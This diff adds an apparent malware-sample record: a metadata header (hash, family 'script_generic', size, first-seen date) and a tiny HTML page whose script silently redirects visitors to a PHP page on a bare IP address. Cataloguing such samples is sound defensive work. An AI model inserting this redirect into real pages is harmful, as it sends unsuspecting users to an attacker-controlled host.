@@ -1,0 +1,16 @@
+# sha256: eca670d7ce5ea9a895dac17d71a12c024381a67e802de8ed457bb06e28959d72
+# family: script_generic
+# kind: script
+# size_bytes: 166
+# first_seen: 2026-09-02 02:12:25.047546 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+<html>
+
+<script language="Javascript" type="text/javascript"> 
+document.location.href='http://179.60.235.162/megaflotpcnv70rosmg/index.php'
+</script>
+
+</html>
